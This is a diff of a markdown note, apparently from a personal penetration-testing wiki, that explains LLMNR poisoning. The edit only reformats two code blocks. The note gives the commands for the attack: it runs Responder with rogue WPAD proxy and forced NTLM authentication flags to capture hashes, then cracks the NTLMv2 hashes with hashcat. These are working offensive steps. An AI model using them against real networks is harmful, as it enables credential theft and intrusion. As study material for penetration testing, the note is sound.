@@ -12,8 +12,8 @@ How to do LLMNR poisoning?
 
 Step 1: Run Responder
 
-```
-$ sudo responder -I eth0 -dwPv
+```bash
+sudo responder -I eth0 -dwPv
 ```
 
 Here, -d is for DHCP requests. -w is for wpad rogue proxy server. -P is for forced NTLM authentication for the proxy. -v is for verbosity.
@@ -30,8 +30,8 @@ Step 3: Get the hashes!!
 
 Step 4: Crack the hashes using Tools like [[Cracking Hashes using Hashcat|Hashcat]]:
 
-```
-$ hashcat -m 5600 hashes.txt rockyou.txt
+```bash
+hashcat -m 5600 hashes.txt rockyou.txt
 ```
 
 Where hashes.txt is your input file and rockyou.txt is the wordlist file.
